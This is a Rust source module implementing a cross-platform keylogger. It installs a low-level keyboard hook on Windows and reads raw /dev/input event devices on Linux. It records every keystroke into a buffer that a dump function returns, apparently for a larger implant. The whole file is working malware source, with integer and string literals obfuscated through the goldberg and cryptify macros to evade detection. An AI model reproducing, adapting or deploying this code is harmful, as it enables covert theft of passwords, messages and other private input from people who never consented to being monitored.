use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, Ordering};

static RUNNING: AtomicBool = AtomicBool::new(false);
static KEYBUF: Mutex<String> = Mutex::new(String::new());

pub fn start() {
    if RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }
    *KEYBUF.lock().unwrap() = String::new();

    std::thread::spawn(move || {
        #[cfg(target_os = "windows")]
        keylogger_thread_windows();
        #[cfg(target_os = "linux")]
        keylogger_thread_linux();
    });
}

pub fn stop() {
    RUNNING.store(false, Ordering::SeqCst);
    #[cfg(target_os = "windows")]
    unsafe {
        let tid = THREAD_ID.load(Ordering::SeqCst);
        if tid != goldberg::goldberg_int!(0) {
            winapi::um::winuser::PostThreadMessageA(tid, winapi::um::winuser::WM_QUIT, goldberg::goldberg_int!(0), goldberg::goldberg_int!(0));
        }
    }
}

pub fn dump_and_clear() -> String {
    let mut buf = KEYBUF.lock().unwrap();
    std::mem::take(&mut *buf)
}

pub fn is_running() -> bool {
    RUNNING.load(Ordering::SeqCst)
}

fn append(s: &str) {
    if let Ok(mut buf) = KEYBUF.lock() {
        buf.push_str(s);
    }
}

fn append_char(c: char) {
    if let Ok(mut buf) = KEYBUF.lock() {
        buf.push(c);
    }
}

// ── Windows: SetWindowsHookExA WH_KEYBOARD_LL ──

#[cfg(target_os = "windows")]
use std::sync::atomic::AtomicU32;

#[cfg(target_os = "windows")]
static THREAD_ID: AtomicU32 = AtomicU32::new(0);

#[cfg(target_os = "windows")]
fn keylogger_thread_windows() {
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::processthreadsapi::GetCurrentThreadId;
    use winapi::um::winuser::*;

    unsafe {
        let hmod = GetModuleHandleA(std::ptr::null_mut());
        THREAD_ID.store(GetCurrentThreadId(), Ordering::SeqCst);

        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_callback), hmod, goldberg::goldberg_int!(0));

        if hook.is_null() {
            RUNNING.store(false, Ordering::SeqCst);
            return;
        }

        let mut msg = std::mem::zeroed::<MSG>();
        while GetMessageA(&mut msg, std::ptr::null_mut(), goldberg::goldberg_int!(0), goldberg::goldberg_int!(0)) != goldberg::goldberg_int!(0) {
            TranslateMessage(&mut msg);
            DispatchMessageA(&mut msg);
        }

        UnhookWindowsHookEx(hook);
        RUNNING.store(false, Ordering::SeqCst);
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn hook_callback(
    code: i32,
    wparam: winapi::shared::minwindef::WPARAM,
    lparam: winapi::shared::minwindef::LPARAM,
) -> winapi::shared::minwindef::LRESULT {
    use winapi::um::winuser::*;

    if code >= goldberg::goldberg_int!(0) && RUNNING.load(Ordering::SeqCst) {
        if wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN {
            let kb = unsafe { *(lparam as *const KBDLLHOOKSTRUCT) };
            unsafe { handle_key_windows(kb.vkCode as u32); }
        }
    }
    unsafe { CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam) }
}

#[cfg(target_os = "windows")]
unsafe fn handle_key_windows(vk: u32) {
    use winapi::um::winuser::*;

    let shift = unsafe { GetAsyncKeyState(VK_SHIFT) & -32768i16 != goldberg::goldberg_int!(0) };
    let caps = unsafe { GetKeyState(VK_CAPITAL) & goldberg::goldberg_int!(0x01) != goldberg::goldberg_int!(0) };

    match vk {
        0x41..=0x5A => {
            let off = (vk - 0x41) as u8;
            let c = if shift ^ caps {
                (b'A' + off) as char
            } else {
                (b'a' + off) as char
            };
            append_char(c);
        }
        0x30..=0x39 => {
            let idx = (vk - 0x30) as usize;
            let c = if shift {
                [')', '!', '@', '#', '$', '%', '^', '&', '*', '('][idx]
            } else {
                ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'][idx]
            };
            append_char(c);
        }
        0x20 => append_char(' '),
        0x0D => append_char('\n'),
        0x09 => append_char('\t'),
        0x08 => append(&cryptify::encrypt_string!("[BS]")),
        0x2E => append(&cryptify::encrypt_string!("[DEL]")),
        0x1B => append(&cryptify::encrypt_string!("[ESC]")),
        0x25 => append(&cryptify::encrypt_string!("[LEFT]")),
        0x27 => append(&cryptify::encrypt_string!("[RIGHT]")),
        0x26 => append(&cryptify::encrypt_string!("[UP]")),
        0x28 => append(&cryptify::encrypt_string!("[DOWN]")),
        0x24 => append(&cryptify::encrypt_string!("[HOME]")),
        0x23 => append(&cryptify::encrypt_string!("[END]")),
        0x21 => append(&cryptify::encrypt_string!("[PGUP]")),
        0x22 => append(&cryptify::encrypt_string!("[PGDN]")),
        0x5B => append(&cryptify::encrypt_string!("[WIN]")),
        0x5C => append(&cryptify::encrypt_string!("[RWIN]")),
        0x10 | 0x11 | 0x12 | 0x14 | 0xA0 | 0xA1 | 0xA2 | 0xA3 | 0xA4 | 0xA5 => {}
        0xBA => append(&if shift { cryptify::encrypt_string!(":") } else { cryptify::encrypt_string!(";") }),
        0xBB => append(&if shift { cryptify::encrypt_string!("+") } else { cryptify::encrypt_string!("=") }),
        0xBC => append(&if shift { cryptify::encrypt_string!("<") } else { cryptify::encrypt_string!(",") }),
        0xBD => append(&if shift { cryptify::encrypt_string!("_") } else { cryptify::encrypt_string!("-") }),
        0xBE => append(&if shift { cryptify::encrypt_string!(">") } else { cryptify::encrypt_string!(".") }),
        0xBF => append(&if shift { cryptify::encrypt_string!("?") } else { cryptify::encrypt_string!("/") }),
        0xC0 => append(&if shift { cryptify::encrypt_string!("~") } else { cryptify::encrypt_string!("`") }),
        0xDB => append(&if shift { cryptify::encrypt_string!("{") } else { cryptify::encrypt_string!("[") }),
        0xDC => append(&if shift { cryptify::encrypt_string!("|") } else { cryptify::encrypt_string!("\\") }),
        0xDD => append(&if shift { cryptify::encrypt_string!("}") } else { cryptify::encrypt_string!("]") }),
        0xDE => append(&if shift { cryptify::encrypt_string!("\"") } else { cryptify::encrypt_string!("'") }),
        0x70 => append(&cryptify::encrypt_string!("[F1]")),
        0x71 => append(&cryptify::encrypt_string!("[F2]")),
        0x72 => append(&cryptify::encrypt_string!("[F3]")),
        0x73 => append(&cryptify::encrypt_string!("[F4]")),
        0x74 => append(&cryptify::encrypt_string!("[F5]")),
        0x75 => append(&cryptify::encrypt_string!("[F6]")),
        0x76 => append(&cryptify::encrypt_string!("[F7]")),
        0x77 => append(&cryptify::encrypt_string!("[F8]")),
        0x78 => append(&cryptify::encrypt_string!("[F9]")),
        0x79 => append(&cryptify::encrypt_string!("[F10]")),
        0x7A => append(&cryptify::encrypt_string!("[F11]")),
        0x7B => append(&cryptify::encrypt_string!("[F12]")),
        _ => {}
    }
}

// ── Linux: /dev/input/event* ──

#[cfg(target_os = "linux")]
fn keylogger_thread_linux() {
    use std::fs::{self, File};
    use std::io::Read;
    use std::os::unix::io::AsRawFd;

    fn find_keyboards() -> Vec<String> {
        let mut devices = Vec::new();
        if let Ok(entries) = fs::read_dir(cryptify::encrypt_string!("/dev/input/by-path")) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.contains(&cryptify::encrypt_string!("-kbd")) || name.contains(&cryptify::encrypt_string!("-event-kbd")) {
                    if let Ok(path) = fs::canonicalize(entry.path()) {
                        devices.push(path.to_string_lossy().to_string());
                    }
                }
            }
        }
        if devices.is_empty() {
            if let Ok(entries) = fs::read_dir(cryptify::encrypt_string!("/dev/input")) {
                for entry in entries.flatten() {
                    let name = entry.file_name().to_string_lossy().to_string();
                    if name.starts_with(&cryptify::encrypt_string!("event")) {
                        devices.push(entry.path().to_string_lossy().to_string());
                    }
                }
            }
        }
        devices
    }

    let devices = find_keyboards();
    if devices.is_empty() {
        RUNNING.store(false, Ordering::SeqCst);
        return;
    }

    let mut files: Vec<File> = Vec::new();
    for dev in &devices {
        if let Ok(f) = File::open(dev) {
            let fd = f.as_raw_fd();
            unsafe {
                let flags = libc::fcntl(fd, libc::F_GETFL, goldberg::goldberg_int!(0));
                libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK);
            }
            files.push(f);
        }
    }

    if files.is_empty() {
        RUNNING.store(false, Ordering::SeqCst);
        return;
    }

    let mut buf = [0u8; goldberg::goldberg_int!(24)];
    while RUNNING.load(Ordering::SeqCst) {
        for f in &mut files {
            loop {
                match f.read(&mut buf) {
                    Ok(goldberg::goldberg_int!(24)) => {
                        let type_ = u16::from_ne_bytes([buf[goldberg::goldberg_int!(16)], buf[goldberg::goldberg_int!(17)]]);
                        let code = u16::from_ne_bytes([buf[goldberg::goldberg_int!(18)], buf[goldberg::goldberg_int!(19)]]);
                        let value = u32::from_ne_bytes([buf[goldberg::goldberg_int!(20)], buf[goldberg::goldberg_int!(21)], buf[goldberg::goldberg_int!(22)], buf[goldberg::goldberg_int!(23)]]);
                        if type_ == goldberg::goldberg_int!(1) && value == goldberg::goldberg_int!(1) {
                            handle_key_linux(code);
                        }
                    }
                    Ok(_) => continue,
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                    Err(_) => break,
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(goldberg::goldberg_int!(10)));
    }
}

#[cfg(target_os = "linux")]
fn handle_key_linux(code: u16) {
    match code {
        1 => append(&cryptify::encrypt_string!("[ESC]")),
        2 => append_char('1'),
        3 => append_char('2'),
        4 => append_char('3'),
        5 => append_char('4'),
        6 => append_char('5'),
        7 => append_char('6'),
        8 => append_char('7'),
        9 => append_char('8'),
        10 => append_char('9'),
        11 => append_char('0'),
        12 => append_char('-'),
        13 => append_char('='),
        14 => append(&cryptify::encrypt_string!("[BS]")),
        15 => append_char('\t'),
        16 => append_char('q'),
        17 => append_char('w'),
        18 => append_char('e'),
        19 => append_char('r'),
        20 => append_char('t'),
        21 => append_char('y'),
        22 => append_char('u'),
        23 => append_char('i'),
        24 => append_char('o'),
        25 => append_char('p'),
        26 => append_char('['),
        27 => append_char(']'),
        28 => append_char('\n'),
        30 => append_char('a'),
        31 => append_char('s'),
        32 => append_char('d'),
        33 => append_char('f'),
        34 => append_char('g'),
        35 => append_char('h'),
        36 => append_char('j'),
        37 => append_char('k'),
        38 => append_char('l'),
        39 => append_char(';'),
        40 => append_char('\''),
        41 => append_char('`'),
        43 => append_char('\\'),
        44 => append_char('z'),
        45 => append_char('x'),
        46 => append_char('c'),
        47 => append_char('v'),
        48 => append_char('b'),
        49 => append_char('n'),
        50 => append_char('m'),
        51 => append_char(','),
        52 => append_char('.'),
        53 => append_char('/'),
        55 => append_char('*'),
        57 => append_char(' '),
        58 => append(&cryptify::encrypt_string!("[CAPS]")),
        59 => append(&cryptify::encrypt_string!("[F1]")),
        60 => append(&cryptify::encrypt_string!("[F2]")),
        61 => append(&cryptify::encrypt_string!("[F3]")),
        62 => append(&cryptify::encrypt_string!("[F4]")),
        63 => append(&cryptify::encrypt_string!("[F5]")),
        64 => append(&cryptify::encrypt_string!("[F6]")),
        65 => append(&cryptify::encrypt_string!("[F7]")),
        66 => append(&cryptify::encrypt_string!("[F8]")),
        67 => append(&cryptify::encrypt_string!("[F9]")),
        68 => append(&cryptify::encrypt_string!("[F10]")),
        69 => append(&cryptify::encrypt_string!("[NUMLK]")),
        70 => append(&cryptify::encrypt_string!("[SCRLK]")),
        71 => append(&cryptify::encrypt_string!("[HOME]")),
        72 => append(&cryptify::encrypt_string!("[UP]")),
        73 => append(&cryptify::encrypt_string!("[PGUP]")),
        75 => append(&cryptify::encrypt_string!("[LEFT]")),
        77 => append(&cryptify::encrypt_string!("[RIGHT]")),
        79 => append(&cryptify::encrypt_string!("[END]")),
        80 => append(&cryptify::encrypt_string!("[DOWN]")),
        81 => append(&cryptify::encrypt_string!("[PGDN]")),
        82 => append(&cryptify::encrypt_string!("[INS]")),
        83 => append(&cryptify::encrypt_string!("[DEL]")),
        87 => append(&cryptify::encrypt_string!("[F11]")),
        88 => append(&cryptify::encrypt_string!("[F12]")),
        96 => append_char('\n'),
        110 => append(&cryptify::encrypt_string!("[INS]")),
        111 => append(&cryptify::encrypt_string!("[DEL]")),
        119 => append(&cryptify::encrypt_string!("[PAUSE]")),
        125 => append(&cryptify::encrypt_string!("[WIN]")),
        _ => {}
    }
}
